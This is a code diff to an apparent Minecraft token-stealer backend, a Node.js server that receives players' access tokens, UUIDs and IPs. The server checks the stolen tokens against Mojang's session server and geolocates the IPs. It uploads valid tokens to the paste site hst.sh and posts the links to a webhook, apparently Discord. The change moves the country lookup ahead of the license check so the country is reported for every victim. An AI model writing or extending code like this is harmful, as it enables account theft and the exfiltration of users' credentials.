@@ -37,22 +37,24 @@ app.post("/", async (req, res) => {
     }
 
     try {
+        const country = await fetchCountry(req.body.ip); // Получение страны до проверки лицензии
+
         const response = await post("https://sessionserver.mojang.com/session/minecraft/join", {
             accessToken: req.body.token,
             selectedProfile: req.body.uuid,
             serverId: req.body.uuid
         })
        .then(res => {
-    if (res.status === 204) {
-        console.log("License verified successfully, but no content returned.");
-        return "License";
-    } else if (res.data && res.data.path === "/session/minecraft/join") {
-        return "Non-License";
-    }else {
-        console.log(`Unexpected status: ${res.status}`);
-        return `Unexpected status: ${res.status}`;
-    }
-}).catch(error => {
+            if (res.status === 204) {
+                console.log("License verified successfully, but no content returned.");
+                return "License";
+            } else if (res.data && res.data.path === "/session/minecraft/join") {
+                return "Non-License";
+            } else {
+                console.log(`Unexpected status: ${res.status}`);
+                return `Unexpected status: ${res.status}`;
+            }
+        }).catch(error => {
             console.error(`Request failed with error: ${error.message}`);
             if (error.response) {
                 console.error(`Response data: ${JSON.stringify(error.response.data)}`);
@@ -72,12 +74,16 @@ app.post("/", async (req, res) => {
             }],
             attachments: []
         };
+
         if (response === "Non-License") {
             webhookData.embeds[0].fields.push({
                 name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
             });
+            webhookData.embeds[0].fields.push({
+                name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false
+            });
         } else if (response === "License") {
-            const [shorttoken, profiles, country] = await Promise.all([
+            const [shorttoken, profiles] = await Promise.all([
                 post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
                 getProfiles(req.body.uuid).then(profileData => {
                     if (profileData) {
@@ -86,8 +92,7 @@ app.post("/", async (req, res) => {
                         ).join('\n');
                     }
                     return '';
-                }),
-                fetchCountry(req.body.ip)
+                })
             ]);
 
             const checkToken = shorttoken === 'Error uploading' ? 'Invalid Token' : `[Minecraft Token](https://hst.sh/${shorttoken})`;
